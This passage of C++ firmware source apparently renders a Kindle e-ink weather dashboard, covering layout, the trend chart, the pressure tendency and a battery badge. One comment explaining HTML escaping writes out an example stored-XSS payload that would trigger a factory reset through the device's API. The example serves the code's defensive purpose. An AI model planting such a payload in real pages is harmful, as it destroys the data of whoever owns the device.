#include "KindleDashboard.h"
#include "../managers/StorageManager.h"   // configFs(): settings live on LittleFS

#ifdef FEATURE_KINDLE_DASHBOARD

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <time.h>
#include <new>
#include <memory>     // shared_ptr — the BMP filler owns its state through one
#include <math.h>

#include "../pipeline/DataPipeline.h"
#include "../pipeline/TrendRing.h"
#include "../utils/MutexGuard.h"
#include "../core/Globals.h"
#include "DashboardStrings.h"
#include "../utils/PosixTz.h"   // tzOffsetAt — TIME_OFF
#include "RefreshCadence.h"
#include "KindleSkin.h"                 // config.kindle -> face, weight, formats
#include "KindleChartBmp.h"             // ChartBmpCtx / ChartBmpReader
#include "KindleSlotStore.h"            // the configurable slot list
#include "KindleFlow.h"                 // where everything goes, for what is on the page
#include "FormArgs.h"                   // queryArg
#include "KindlePkg.h"                  // PKG_* — the reader's own update
#ifdef FEATURE_ESPNOW_INGEST
#  include "../espnow/EspNowIngest.h"   // espnowAnyBatteryWarn()
#endif

#ifdef MODULE_FORECAST_ENABLED
#  include "../modules/ForecastModule.h"
#endif

// The most outlook columns any page sends — ForecastModule::OUTLOOK_N, which a
// build without the module cannot name, and KdFlow::olX's length.
static constexpr int KD_FC_COLS = KDF_OL_MAX;
#ifdef MODULE_FORECAST_ENABLED
static_assert(ForecastModule::OUTLOOK_N == KD_FC_COLS, "outlook columns");
#endif

// Every forecast key, empty. Two callers — a build without the module and a
// page drawn in standalone — and they have to send the same set: a key that
// one of them omits is a key the panel keeps from the LAST payload, which is
// how a forecast that is no longer being drawn goes on being remembered.
static void kdForecastKeysEmpty(AsyncResponseStream* s) {
    s->print("FC_SUMMARY=\"\"\nFC_CODE=-1\nFC_ICON=-1\nFC_HIGH=\nFC_LOW=\n"
             "FC_WIND=\nFC_AGE=\"\"\nFC_SUMMARY_ADVW=0\n");
    for (int i = 0; i < KD_FC_COLS; i++)
        s->printf("FC%d_LABEL=\"\"\nFC%d_LABELW=0\nFC%d_CODE=-1\nFC%d_ICON=-1\n"
                  "FC%d_TEMP=\nFC%d_TEMPW=0\nFC%d_LOW=\n", i, i, i, i, i, i, i);
}

// ---------------------------------------------------------------------------
// Standalone: the page a collector draws when it is the whole network
// ---------------------------------------------------------------------------
// A collector running as its own access point — wifi and ESP-NOW nodes talking
// straight to it, nothing upstream — cannot fetch a forecast. The forecast is
// an eighth of the page, and left in place it is a band of white on the panel
// and a circled question mark in the browser: the one block that is furniture
// rather than information, sitting where the readings could be.
//
// So the band goes and the readings take it: the same eleven places, set large
// enough to read from across a room. See kindle/layout/600x800-standalone.conf
// for where every number lands, and the `.sa` rules in the stylesheet below
// for the browser's half of the same design.
//
// WHAT COUNTS AS "NO FORECAST TO DRAW" is deliberately broader than "no
// internet": a build without the module, an AP with nobody upstream, and a
// forecast nobody has been able to refresh for a quarter of a day are the same
// thing to a reader standing in front of the panel. The last one is a real
// case rather than a hypothetical — a collector that keeps wifi but loses its
// upstream serves a forecast that is still formatted, still plausible, and
// hours stale.
static constexpr uint32_t KD_FORECAST_STALE_S = 6 * 3600;

static bool kdStandalone() {
    #ifdef MODULE_FORECAST_ENABLED
    const auto& fc = forecastModule.snapshot();
    const uint32_t fetchedAt = fc.fetchedAt;
    const bool haveModule = true;
    #else
    const uint32_t fetchedAt = 0;
    const bool haveModule = false;
    #endif
    // The rule itself is in KindleSkin.h, where tests/host/test_kindle_skin.cpp
    // can reach every arm of it without a radio or a network.
    return kdStandaloneDecide(config.kindle.layoutMode, haveModule,
                              apModeTriggered, fetchedAt,
                              (uint32_t)time(nullptr), KD_FORECAST_STALE_S);
}

// The shape a request asks for. The FBInk reader carries its own override —
// LAYOUT= in dash.conf, KUAL's Settings → Screen → Page shape — and sends it as
// ?shape= so the layout is worked out for the page it will actually draw; a
// request that does not say takes the collector's own answer.
static bool kdStandaloneFor(AsyncWebServerRequest* req) {
    if (const String* v = req ? queryArg(req, "shape") : nullptr) {
        if (*v == "normal")     return false;
        if (*v == "standalone") return true;
    }
    return kdStandalone();
}

// Which way up the page is. The FBInk reader can carry its own — ROTATE= in
// dash.conf, KUAL's Settings → Screen → Rotation — and sends it as ?rot= in
// degrees, so the layout is worked out for the page it will actually draw; the
// browser page takes it the same way, for a reader to bookmark. Without one,
// `stored` — the panel's rotation for the FBInk payload, the page's own
// (kdPageRot(), which may differ) for the browser page.
static uint8_t kdRotFor(AsyncWebServerRequest* req, uint8_t stored) {
    if (const String* v = req ? queryArg(req, "rot") : nullptr)
        return kdRotFromDeg(v->toInt(), stored);
    return stored;
}

// ---------------------------------------------------------------------------
// Which reader the page is laid out for
// ---------------------------------------------------------------------------
// THE BROWSER DOES NOT TAKE THE VIEWPORT META. Measured on a Paperwhite 4
// (firmware 5.18.1.1, GET /kindle/probe): devicePixelRatio 2, screen 536x724,
// and a page declared width=600 drawn 600 CSS px wide in a 536 px window —
// cut at the right with a scroll bar under it. So the page is laid out at the
// reader's own width instead, and the browser has nothing left to scale.
//
// That width comes from, in order: ?scr=WxH on the address (what the page's
// own script adds — see kdAutoScript() — or a bookmark); the Device setting;
// and failing both, KINDLE_PAGE_W, the page this always drew.
//
// FITTED, NOT STRETCHED: the design is 600 x 800, and a screen whose usable
// height (less ?bar= or the Bar setting, the browser's own toolbar) is
// shorter than three-quarters of its width gets a narrower page, centred.

/// What one render is laid out at.
struct KdPage {
    int  w        = KINDLE_PAGE_W;   ///< the page, CSS px: what kdPx() scales to
    int  screenW  = 0;               ///< the screen it is centred in; 0 = unknown
};

/// "536x724" — digits, an x, digits, each a size a screen could be.
static bool kdParseScr(const String& v, int& w, int& h) {
    const int x = v.indexOf('x');
    if (x <= 0) return false;
    for (unsigned i = 0; i < v.length(); i++)
        if ((int)i != x && (v[i] < '0' || v[i] > '9')) return false;
    w = v.substring(0, x).toInt();
    h = v.substring(x + 1).toInt();
    return w >= 200 && w <= 4000 && h >= 200 && h <= 4000;
}

static int kdBarFor(AsyncWebServerRequest* req, const KindleConfig& skin) {
    if (const String* b = req ? queryArg(req, "bar") : nullptr) {
        const long v = b->toInt();
        return v < 0 ? 0 : (v > KDEV_BAR_MAX ? KDEV_BAR_MAX : (int)v);
    }
    return skin.browserBar;
}

static KdPage kdPageFor(AsyncWebServerRequest* req, const KindleConfig& skin) {
    KdPage pg;
    int w = 0, h = 0;
    const String* scr = req ? queryArg(req, "scr") : nullptr;
    if (!(scr && kdParseScr(*scr, w, h))) {
        const KdDevice* d = kdDevice(skin.browserDev);
        if (!d) return pg;
        w = d->w; h = d->h;
    }
    const int usable = h - kdBarFor(req, skin);
    int pw = w;
    if (usable > 0 && usable * 600 / 800 < pw) pw = usable * 600 / 800;
    if (pw < 320)  pw = 320;
    if (pw > 2400) pw = 2400;
    pg.w = pw;
    pg.screenW = w;
    return pg;
}

// The ?rot=, ?scr= and ?bar= this request came with, to carry on: every link
// and meta refresh back to /kindle from a bookmarked /kindle?rot=90 has to keep
// the page on its side, or one tap on "refresh" turns it upright — and one
// laid out for this reader's screen has to stay laid out for it. Empty when
// there were none. Each is checked before it is repeated into a page.
static String kdRotArg(AsyncWebServerRequest* req, char sep) {
    String a;
    if (!req) return a;
    if (const String* v = queryArg(req, "rot")) {
        const long deg = v->toInt();
        if (kdRotFromDeg(deg, 0xFF) != 0xFF) {
            a += sep; sep = '&';
            a += F("rot=");
            a += deg;
        }
    }
    int w, h;
    if (const String* v = queryArg(req, "scr")) {
        if (kdParseScr(*v, w, h)) {
            a += sep; sep = '&';
            a += F("scr=");
            a += w; a += 'x'; a += h;
        }
    }
    // Carried as kdBarFor() reads it — held to 0..KDEV_BAR_MAX — so the page
    // a link leads to is laid out with the same bar as the one it is on.
    if (queryArg(req, "bar")) {
        a += sep;
        a += F("bar=");
        a += kdBarFor(req, config.kindle);
    }
    return a;
}

// A reader on auto whose address does not say what it is: ask its browser,
// once, and come back with the answer on the address — which every link and
// refresh then carries (kdRotArg). A browser that runs no script stays on the
// page as it is, at KINDLE_PAGE_W. location.replace, so Back does not return
// to the page that was only ever a question.
static void kdAutoScript(String& p, AsyncWebServerRequest* req, const KindleConfig& skin) {
    if (skin.browserDev != KDEV_AUTO || !req || queryArg(req, "scr")) return;
    p += F("<script>try{var s=window.screen;if(s&&s.width>199&&s.height>199)"
           "location.replace('/kindle?scr='+s.width+'x'+s.height+'");
    p += kdRotArg(req, '&');
    p += F("')}catch(e){}</script>");
}

// The left half of the footer. "Measured on site" is the right thing to say
// about a page whose numbers came over a network from a device on a windowsill;
// on an AP with nothing upstream, the useful sentence is which network this is
// and whether anything is still reporting into it — the two facts a reader has
// no other way to get without a cable or a browser.
static void kdFooterNote(char* buf, size_t n) {
    if (!kdStandalone() || !apModeTriggered) {
        snprintf(buf, n, "%s", KD_T("Measured on site", "Измерено на място"));
        return;
    }
    // THE PANEL'S FOOTER IS 378 px WIDE BEFORE THE STATUS LINE, and FBInk
    // does not clip: a long name would be drawn straight through the battery
    // and the power mode at STAT_X. An SSID is up to 32 characters, so it is
    // taken to 16 — on a UTF-8 boundary, because a name cut inside a two-byte
    // letter draws as a box glyph on both renderers.
    const char* ssid = (strlen(config.network.apSSID) > 0)
                     ? config.network.apSSID : config.deviceName;
    char shortSsid[17];
    size_t cut = 0;
    while (ssid[cut] && cut < sizeof(shortSsid) - 1) cut++;
    while (cut > 0 && ((unsigned char)ssid[cut] & 0xC0) == 0x80) cut--;
    memcpy(shortSsid, ssid, cut);
    shortSsid[cut] = '\0';

    int at = snprintf(buf, n, "AP %s", shortSsid);
    if (at < 0 || (size_t)at >= n) return;

    #ifdef FEATURE_ESPNOW_INGEST
    // The nodes this collector is actually hearing from, and how long ago the
    // most recent of them spoke. Not the station count: a phone on the AP and
    // the Kindle itself are stations, and neither is a reading.
    EspNowNode nodes[ESPNOW_MAX_NODES];
    const int copied = espnowCopyNodes(nodes, ESPNOW_MAX_NODES);
    // THE ONES IT HAS ACTUALLY HEARD FROM, not the ones provisioned. A node
    // paired an hour ago and never seen since is not something reporting into
    // this network, and counting it says the opposite of what the line is for.
    int have = 0;
    uint32_t newest = 0;
    for (int i = 0; i < copied; i++) {
        if (!nodes[i].everSeen) continue;
        have++;
        if (nodes[i].lastSeenMs > newest) newest = nodes[i].lastSeenMs;
    }
    if (have > 0) {
        at += snprintf(buf + at, n - at, KD_T(" · %d node%s", " · %d възел%s"),
                       have, (have == 1) ? "" : KD_T("s", "а"));
        if (at < 0 || (size_t)at >= n) return;
        if (newest) {
            // Minutes up to an hour, then hours — the same shape the page's
            // own age line takes, and it keeps this string short enough for
            // the footer whatever happens to the node.
            const uint32_t mins = (millis() - newest) / 60000u;
            if (mins < 1)       snprintf(buf + at, n - at, KD_T(" · just now", " · току-що"));
            else if (mins < 60) snprintf(buf + at, n - at,
                                         KD_T(" · %lu min ago", " · преди %lu мин"),
                                         (unsigned long)mins);
            else                snprintf(buf + at, n - at,
                                         KD_T(" · %lu h ago", " · преди %lu ч"),
                                         (unsigned long)(mins / 60));
        }
    }
    #endif
}

static constexpr int PAGE_W  = KINDLE_PAGE_W;
#define CHART_W kdPx(560)   // a macro: kdPx() follows the page width of each request
// The chart's height is not a constant any more: it is what the layout had
// left once the readings above it stopped growing — see KindleFlow.h. 220 is
// what it is on the ordinary page, and the least it ever is.

static const char* outdoorSensorId() {
    return (config.kindle.outdoorSensor[0] != '\0') ? config.kindle.outdoorSensor : KINDLE_OUTDOOR_SENSOR;
}

static const char* indoorSensorId() {
    return (config.kindle.indoorSensor[0] != '\0') ? config.kindle.indoorSensor : KINDLE_INDOOR_SENSOR;
}

// ---------------------------------------------------------------------------
// Reading the current values
// ---------------------------------------------------------------------------
struct Latest {
    float    value = NAN;
    uint32_t ts    = 0;
    bool     ok    = false;
    // Carried from the reading rather than configured per slot. A metric's
    // unit is a property of the sensor that produced it — an SDS011 knows its
    // PM is µg/m³ and a BH1750 knows its light is lux — so asking the reader to
    // type it into a slot would be asking them to repeat something the
    // pipeline already knows, and to get it wrong.
    char     unit[12] = {0};
};

static Latest latestOf(const char* sensorId, const char* metric) {
    Latest out;
    SensorReading r;
    // The same 5 ms budget ProcessingTask allows itself: a dashboard render
    // must never be the reason a reading is dropped.
    MutexGuard g(webDataMutex, pdMS_TO_TICKS(5));
    if (g.isLocked() && webRingBuf.findLast(sensorId, metric, r)) {
        out.value = r.value;
        out.ts    = r.timestamp;
        out.ok    = true;
        strncpy(out.unit, r.unit, sizeof(out.unit) - 1);
    }
    return out;
}

/// The reading a slot names, with the same humidity preference the fixed
/// zones have always applied: a self-heating-corrected figure when the sensor
/// publishes one. Routed through here rather than through latestOf() directly
/// so a slot configured as plain "humidity" gets the corrected value, which is
/// what the reader means and what the page used to show.
static Latest slotReading(const KindleSlot& s);

// The humidity to show, preferring the self-heating-corrected figure.
//
// A BME280 or BME688 on a board that runs WiFi reads warm, and relative
// humidity is relative TO a temperature — so a warm sensor reports a room
// drier than it is. Both plugins publish "humidity_amb": the same air
// re-expressed at the true ambient temperature, by way of a dew point that is
// invariant under heating the sensor.
//
// Falling back to the raw figure rather than showing nothing: a sensor with no
// correction configured publishes no corrected figure at all (it would be a
// copy of the raw one), and one whose derived pair was dropped as out of range
// still has a humidity worth printing.
static Latest humidityOf(const char* sensorId) {
    Latest corrected = latestOf(sensorId, "humidity_amb");
    if (corrected.ok) return corrected;
    return latestOf(sensorId, "humidity");
}

static Latest slotReading(const KindleSlot& s) {
    if (strcmp(s.metric, "humidity") == 0) return humidityOf(s.sensorId);
    return latestOf(s.sensorId, s.metric);
}

// ---------------------------------------------------------------------------
// Formatting
// ---------------------------------------------------------------------------
// One decimal by default. A tenth of a degree is the most an e-ink glance can
// use, and two decimals make the big type wrap.
//
// Zero is offered as a setting (config.kindle.tempDecimals) rather than as a
// second opinion about precision: a whole-degree page is a legitimately
// different thing to want from across a room, and the reading it drops was
// never load-bearing. Anything above one is not offered, because the column
// has no room for it.
static void fmtTemp(char* buf, size_t n, float v, int dec = 1) {
    if (!isfinite(v)) { snprintf(buf, n, "--"); return; }
    snprintf(buf, n, dec ? "%.1f" : "%.0f", (double)v);
}

static void fmtInt(char* buf, size_t n, float v) {
    if (!isfinite(v)) { snprintf(buf, n, "--"); return; }
    snprintf(buf, n, "%.0f", (double)v);
}


// ---------------------------------------------------------------------------
// Barometric tendency
// ---------------------------------------------------------------------------
// The three-hour pressure change is the one genuinely predictive number a
// home station can produce, and TrendRing already stores pressure hourly —
// it was simply never shown. Bands follow the usual synoptic convention:
// 1.6 hPa / 3 h is "rapid", 0.5 is the threshold for calling any direction.
// `idx` is the band, 0 rising fast .. 4 falling fast: the page, the panel and
// the place arrows each draw it with their own glyphs, from this one reading
// of the thresholds.
struct Tendency { bool have = false; uint8_t idx = 2; float delta = 0.0f; const char* word = ""; const char* arrow = ""; };

// The same five bands as UTF-8, for the panel and the places: `arrow` above
// is an HTML entity, which only the page can use.
static const char* const KD_TEND_ARROWS[] = { "↑", "↗", "→", "↘", "↓" };

static Tendency pressureTendency(const TrendRing::Hour* h) {
    Tendency t;
    const TrendRing::Hour& now  = h[TrendRing::HOURS - 1];
    const TrendRing::Hour& then = h[TrendRing::HOURS - 4];   // three hours back
    if (now.count == 0 || then.count == 0) return t;

    t.delta = (now.sum / now.count) - (then.sum / then.count);
    t.have  = true;
    if      (t.delta >=  1.6f) { t.idx = 0; t.word = KD_T("rising fast",  "расте бързо"); t.arrow = "&#8593;"; }
    else if (t.delta >=  0.5f) { t.idx = 1; t.word = KD_T("rising",       "расте");       t.arrow = "&#8599;"; }
    else if (t.delta >  -0.5f) { t.idx = 2; t.word = KD_T("steady",       "без промяна"); t.arrow = "&#8594;"; }
    else if (t.delta >  -1.6f) { t.idx = 3; t.word = KD_T("falling",      "пада");        t.arrow = "&#8600;"; }
    else                       { t.idx = 4; t.word = KD_T("falling fast", "пада бързо");  t.arrow = "&#8595;"; }
    return t;
}

// ---------------------------------------------------------------------------
// The trend chart
// ---------------------------------------------------------------------------
// Two series over 24 hours. The outdoor series is drawn as a BAND between its
// hourly min and max with the mean as a solid line through it; indoor is a
// dashed mean line only.
//
// The band is the point. TrendRing keeps min/max per hour precisely so an
// overnight excursion is visible, and a mean-only line throws that away — a
// night that dipped to -3 and recovered by dawn looks identical to one that
// sat at +2. It also costs nothing: the data was already being stored.
//
// The band is a flat #d8d8d8 wash with a #8f8f8f outline. It was hatched at
// first, on the belief that 16-level e-ink dithers mid-greys into noise at
// this size; that was wrong. Flat, well-separated tones each land on their own
// level and render solid, and over a wash the hatch was texture on texture —
// two bands that nearly touch read as one muddy mass.
//
// Gaps break both the band and the lines instead of interpolating. A flat
// line through a four-hour outage reads as "it was steady", which is a lie.
/// Has this series any reading in it at all?
///
/// NOT THE SAME QUESTION AS trendRing.series()'s return, which answers "is this
/// series tracked" — and every one of them is, from kindleTrackTrends() at
/// boot, whether or not a reading has ever arrived. Using that as "there is a
/// line to name" put the chart's key under the "the record fills as readings
/// arrive" note on a fresh boot: two swatches naming two lines that are not
/// drawn, on the one screen this branch exists to keep honest.
static bool seriesHasData(const TrendRing::Hour* h) {
    if (h == nullptr) return false;
    for (int i = 0; i < TrendRing::HOURS; i++) if (h[i].count) return true;
    return false;
}

// ── The first two hours, drawn five minutes at a time ────────────────────
//
// An hourly chart has one point in its first hour and two in its second, so
// a collector that had just started showed an empty chart for an hour and a
// single segment after it. While the hourly record holds two hours or fewer,
// the chart is drawn from TrendRing::recent() instead: the last two hours in
// five-minute buckets, the same 24 points, so every renderer — the page, the
// image and the panel's axis — only relabels its hours as minutes. From the
// third hour on it is the 24-hour chart it always was.
static constexpr int KD_CHART_FINE_HOURS = 2;

static bool kdChartWantsFine(const TrendRing::Hour* tOut, const TrendRing::Hour* tIn,
                             bool haveOut, bool haveIn) {
    int n = 0;
    for (int i = 0; i < TrendRing::HOURS; i++)
        if ((haveOut && tOut[i].count) || (haveIn && tIn[i].count)) n++;
    return n <= KD_CHART_FINE_HOURS;
}

/// Replace the hourly buckets with the five-minute ones, when the chart wants
/// them. A single point draws nothing — no segment, no band — so until a
/// second bucket has a reading the chart is the empty one, with its note:
/// which is five minutes after the first reading.
static void kdChartUseFine(uint32_t now, TrendRing::Hour* tOut, TrendRing::Hour* tIn,
                           bool haveOut, bool haveIn) {
    if (haveOut) trendRing.recent(outdoorSensorId(), "temperature", now, tOut);
    if (haveIn)  trendRing.recent(indoorSensorId(),  "temperature", now, tIn);
    int most = 0;
    for (int s = 0; s < 2; s++) {
        const TrendRing::Hour* h = s ? tIn : tOut;
        if (!(s ? haveIn : haveOut)) continue;
        int n = 0;
        for (int i = 0; i < TrendRing::HOURS; i++) if (h[i].count) n++;
        if (n > most) most = n;
    }
    if (most < 2) {
        memset(tOut, 0, sizeof(TrendRing::Hour) * TrendRing::HOURS);
        memset(tIn,  0, sizeof(TrendRing::Hour) * TrendRing::HOURS);
    }
}

/// The label under point i of the chart: "-23h" hourly, "-115m" fine.
static void kdChartTick(char* buf, size_t n, int i, bool fine) {
    const int back = TrendRing::HOURS - 1 - i;
    if (fine) snprintf(buf, n, "-%dm", back * (int)(TrendRing::FINE_S / 60));
    else      snprintf(buf, n, "-%dh", back);
}

/// <line class="cls" x1 y1 x2 y2/> — the chart's rules.
static void kdSvgLine(String& out, const char* cls, int x1, int y1, int x2, int y2) {
    out += F("<line class=\""); out += cls;
    out += F("\" x1=\""); out += x1; out += F("\" y1=\""); out += y1;
    out += F("\" x2=\""); out += x2; out += F("\" y2=\""); out += y2; out += F("\"/>");
}

static void appendChart(String& out,
                        const TrendRing::Hour* a, const TrendRing::Hour* b,
                        bool haveA, bool haveB, int CHART_H, int chartW = CHART_W,
                        bool fine = false) {
    float lo =  1e9f, hi = -1e9f;
    for (int i = 0; i < TrendRing::HOURS; i++) {
        if (haveA && a[i].count) { if (a[i].min < lo) lo = a[i].min; if (a[i].max > hi) hi = a[i].max; }
        if (haveB && b[i].count) { if (b[i].min < lo) lo = b[i].min; if (b[i].max > hi) hi = b[i].max; }
    }
    // NOTHING RECORDED YET STILL GETS A CHART: the grid and the hour axis,
    // with no scale down the side and the sentence inside the plot. The
    // section used to collapse to a line of text, so the page changed shape
    // the first hour a reading arrived; now it is the same page, filling in.
    const bool empty = (lo > hi);
    if (empty) { lo = 0.0f; hi = 1.0f; }
    float pad = (hi - lo) * 0.06f;
    if (pad < 0.4f) pad = 0.4f;
    lo -= pad; hi += pad;
    const float span = hi - lo;
    if (empty) haveA = haveB = false;

    const int L = kdPx(40), R = chartW - kdPx(4), T = kdPx(10), B = CHART_H - kdPx(26);
    const float dx = (float)(R - L) / (float)(TrendRing::HOURS - 1);

    // Local lambdas would be tidier, but this file targets a toolchain shared
    // with the 4 MB C3 build and plain helpers keep the generated code small.
    #define KD_X(i)   (L + (int)(dx * (float)(i)))
    #define KD_Y(v)   (T + (int)((hi - (v)) / span * (float)(B - T)))

    out += F("<svg class=\"chart\" width=\""); out += chartW;
    out += F("\" height=\""); out += CHART_H;
    out += F("\" viewBox=\"0 0 "); out += chartW; out += ' '; out += CHART_H;
    out += F("\">");

    // Three-hourly verticals, drawn first so the band and lines cover them.
    // They are the ruler that lets the eye carry a point on the curve down to
    // the hour axis, which six-hourly labels alone do not: between two labels
    // there was nothing to count against. Lighter than the horizontals on
    // purpose — this is scaffolding, not data.
    for (int i = 0; i < TrendRing::HOURS; i += 3) {
        kdSvgLine(out, "vgrid", KD_X(i), T, KD_X(i), B);
    }
    // 24 hours is not a multiple of 3 from the right-hand end, and "now" is
    // the one hour always worth a line of its own.
    kdSvgLine(out, "vgrid", KD_X(TrendRing::HOURS - 1), T, KD_X(TrendRing::HOURS - 1), B);

    // Five horizontal rules, the lowest doubling as the baseline. Three
    // made the scale too coarse to read a couple of degrees off.
    for (int k = 0; k <= 4; k++) {
        const float v = hi - span * (float)k / 4.0f;
        const int   y = T + (int)((float)(B - T) * (float)k / 4.0f);
        kdSvgLine(out, k == 4 ? "base" : "grid", L, y, R, y);
        if (empty) continue;
        char lbl[12]; fmtInt(lbl, sizeof(lbl), v);
        out += F("<text class=\"ax\" x=\""); out += L - kdPx(7);
        out += F("\" y=\""); out += y + kdPx(4);
        out += F("\" text-anchor=\"end\">"); out += lbl; out += F("</text>");
    }

    // Outdoor min/max band, one polygon per contiguous run of live hours.
    if (haveA) {
        int i = 0;
        while (i < TrendRing::HOURS) {
            if (a[i].count == 0) { i++; continue; }
            int j = i;
            while (j + 1 < TrendRing::HOURS && a[j + 1].count) j++;
            if (j > i) {                      // a single hour has no width to fill
                String d;
                for (int k = i; k <= j; k++) {
                    d += (k == i) ? 'M' : 'L';
                    d += KD_X(k); d += ' '; d += KD_Y(a[k].max); d += ' ';
                }
                for (int k = j; k >= i; k--) {
                    d += 'L'; d += KD_X(k); d += ' '; d += KD_Y(a[k].min); d += ' ';
                }
                d += 'Z';
                out += F("<path class=\"band\" d=\""); out += d; out += F("\"/>");
            }
            i = j + 1;
        }
    }

    // Mean lines on top of the band.
    for (int sIdx = 0; sIdx < 2; sIdx++) {
        const TrendRing::Hour* h = sIdx ? b : a;
        if (!(sIdx ? haveB : haveA)) continue;
        String d;
        bool pen = false;
        for (int i = 0; i < TrendRing::HOURS; i++) {
            if (h[i].count == 0) { pen = false; continue; }
            d += pen ? 'L' : 'M';
            d += KD_X(i); d += ' '; d += KD_Y(h[i].sum / h[i].count); d += ' ';
            pen = true;
        }
        if (d.length()) {
            out += F("<path class=\""); out += (sIdx ? "l-in" : "l-out");
            out += F("\" d=\""); out += d; out += F("\"/>");
        }
    }

    for (int i = 0; i < TrendRing::HOURS; i += 6) {
        out += F("<text class=\"ax\" x=\""); out += KD_X(i);
        out += F("\" y=\""); out += CHART_H - kdPx(8);
        out += F("\" text-anchor=\"middle\">");
        char tick[12]; kdChartTick(tick, sizeof(tick), i, fine);
        out += tick;
        out += F("</text>");
    }
    // The right-hand edge is now, and the stride above never lands on it.
    // Leaving it bare made the axis read as if it stopped five hours ago.
    out += F("<text class=\"ax\" x=\""); out += KD_X(TrendRing::HOURS - 1);
    out += F("\" y=\""); out += CHART_H - kdPx(8);
    out += F("\" text-anchor=\"end\">");
    out += kdT("now", "сега");
    out += F("</text>");

    if (empty) {
        out += F("<text class=\"ax\" x=\""); out += (L + R) / 2;
        out += F("\" y=\""); out += (T + B) / 2 + kdPx(4);
        out += F("\" text-anchor=\"middle\">");
        out += kdT("The record fills as readings arrive.",
                   "Записът се попълва с постъпването на данни.");
        out += F("</text>");
    }

    #undef KD_X
    #undef KD_Y
    out += F("</svg>");
}

// One legend swatch. It has to be drawn with the same stroke as the line it
// stands for — .l-out #000/3, .l-in #777/2 dashed — or the key describes a
// chart the reader is not looking at, which is exactly what it did before.
// Emitted rather than written as a literal so it scales with the page.
static void appendKeySwatch(String& out, const char* colour, int width, bool dashed) {
    out += F("<svg width=\"");  out += kdPx(26);
    out += F("\" height=\"");   out += kdPx(9);
    out += F("\"><line x1=\"0\" y1=\""); out += kdPx(5);
    out += F("\" x2=\"");       out += kdPx(26);
    out += F("\" y2=\"");       out += kdPx(5);
    out += F("\" stroke=\"");   out += colour;
    out += F("\" stroke-width=\""); out += kdPx(width);
    if (dashed) {
        out += F("\" stroke-dasharray=\""); out += kdPx(7);
        out += ' ';                         out += kdPx(5);
    }
    out += F("\"/></svg>");
}

// The battery warning badge.
//
// WHERE, AND WHY THERE
// --------------------
// Top right of the outdoor block, level with its label, in the only piece of
// empty space on the page — right of the humidity figure and left of the
// column rule. Everything else here is a measurement; the one thing that is
// not competes with nothing.
//
// DRAWN, NOT TYPED
// ----------------
// Inline SVG rather than a character. The reader's font is whatever the device
// firmware ships and its coverage varies; a glyph that renders as a box is
// worse than no warning at all, because it reads as a rendering fault rather
// than as a low battery. Every stroke here is a path, so it looks the same on
// every firmware.
//
// A DARK FILL AND A HOLE THROUGH IT
// ---------------------------------
// The panel is greyscale and the page is otherwise light, so a solid black
// plate is the only thing on it that reads as an alarm at arm's length. The
// battery outline and the exclamation are cut OUT of it in white rather than
// drawn on top: on a screen with no colour, inverted is the loudest a small
// mark gets.
/// One of the badge's rects: `rx` rounds it, `white` fills it #fff, else #000.
static void kdSvgRect(String& out, int x, int y, int w, int h, bool white, int rx = 0) {
    out += F("<rect x=\""); out += x;
    out += F("\" y=\"");      out += y;
    out += F("\" width=\"");  out += w;
    out += F("\" height=\""); out += h;
    if (rx) { out += F("\" rx=\""); out += rx; }
    out += white ? F("\" fill=\"#fff\"/>") : F("\" fill=\"#000\"/>");
}

static void appendBatteryBadge(String& out) {
    const int w = kdPx(46), h = kdPx(22);

    out += F("<svg class=\"bw\" width=\""); out += w;
    out += F("\" height=\"");                 out += h;
    out += F("\" viewBox=\"0 0 ");            out += w;
    out += ' ';                               out += h;
    out += F("\">");

    // The plate.
    kdSvgRect(out, 0, 0, w, h, false, kdPx(3));

    // Battery body, knocked through in white: a filled shell with the inside
    // punched back to black, which is a stroke drawn as two rects because an
    // e-ink panel renders a 1 px stroke unevenly at this size.
    const int bx = kdPx(7), by = kdPx(6), bw = kdPx(24), bh = kdPx(10), t2 = kdPx(2);
    kdSvgRect(out, bx, by, bw, bh, true);
    kdSvgRect(out, bx + t2, by + t2, bw - 2 * t2, bh - 2 * t2, false);

    // The terminal nub.
    kdSvgRect(out, bx + bw, by + kdPx(3), kdPx(3), bh - kdPx(6), true);

    // The exclamation, to the right of the cell. Two marks and a gap, so it
    // survives being scaled down with KINDLE_PAGE_W.
    const int ex = kdPx(38);
    kdSvgRect(out, ex, kdPx(5), kdPx(3), kdPx(8), true);
    kdSvgRect(out, ex, kdPx(15), kdPx(3), kdPx(3), true);

    out += F("</svg>");
}

/// Whether any battery node is low enough to warrant the badge.
///
/// One place, so the renderer and the web interface cannot disagree about what
/// counts as a warning: both ask the same espnowAnyBatteryWarn(), which is
/// batteryShouldWarn() over the same history. A build without the radio has no
/// battery nodes and no badge.
static bool batteryWarningActive() {
#ifdef FEATURE_ESPNOW_INGEST
    return espnowAnyBatteryWarn();
#else
    return false;
#endif
}

// Smallest and largest hourly extreme across the window, for the caption.
static bool windowExtremes(const TrendRing::Hour* h, float& mn, float& mx) {
    mn = 1e9f; mx = -1e9f;
    for (int i = 0; i < TrendRing::HOURS; i++) {
        if (!h[i].count) continue;
        if (h[i].min < mn) mn = h[i].min;
        if (h[i].max > mx) mx = h[i].max;
    }
    return mn <= mx;
}

// "4 min" / "3 h" — an age the reader can judge without doing arithmetic
// against a clock they may not be able to see.
static void appendAge(String& out, uint32_t ts, uint32_t now) {
    if (ts == 0 || now <= ts) return;
    const uint32_t mins = (now - ts) / 60u;
    if (mins < 2) return;                       // fresh; saying so is noise
    out += F(" &middot; ");
    if (mins < 60) { out += mins;        out += kdT(" min old", " мин"); }
    else           { out += (mins / 60); out += kdT(" h old",   " ч");   }
}

// Text into HTML.
//
// EVERY STRING ON THIS PAGE USED TO BE A LITERAL. Slot labels are the first
// that a person types, and they arrive through POST /api/kindle/slots, are
// stored, and are rendered back on a page served without authentication — the
// exact shape of a stored cross-site scripting bug. A label of
// `<script>fetch('/api/factory_reset',{method:'POST'})</script>` would run in
// the browser of whoever opened the dashboard.
//
// The reader itself is a 2014 browser that would probably not manage the
// attack, but /kindle is reachable from any browser on the network, and "the
// intended client is too old to be exploited" is not a security property.
static void appendEscaped(String& out, const char* s) {
    if (!s) return;
    for (const char* q = s; *q; q++) {
        switch (*q) {
            case '&':  out += F("&amp;");  break;
            case '<':  out += F("&lt;");   break;
            case '>':  out += F("&gt;");   break;
            case '"':  out += F("&quot;"); break;
            case '\'': out += F("&#39;");  break;
            default:   out += *q;          break;
        }
    }
}


// ---------------------------------------------------------------------------
// Week strip
// ---------------------------------------------------------------------------
// The current week with today inverted. It fills the foot of the page, which
